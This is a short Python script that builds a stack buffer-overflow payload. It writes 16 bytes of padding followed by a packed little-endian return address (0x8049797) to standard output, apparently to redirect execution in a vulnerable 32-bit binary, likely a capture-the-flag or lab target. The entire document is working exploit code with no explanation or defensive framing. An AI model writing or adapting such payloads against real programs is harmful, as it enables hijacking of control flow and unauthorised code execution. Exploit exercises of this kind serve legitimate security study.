import sys
import struct

toBeOutputted = b""
addressOffset = 16
padding = b"a" * addressOffset
toBeOutputted += padding
returnAddress = 0x8049797
returnAddressToEndian = struct.pack("<I", returnAddress)
toBeOutputted += returnAddressToEndian
sys.stdout.buffer.write(toBeOutputted)

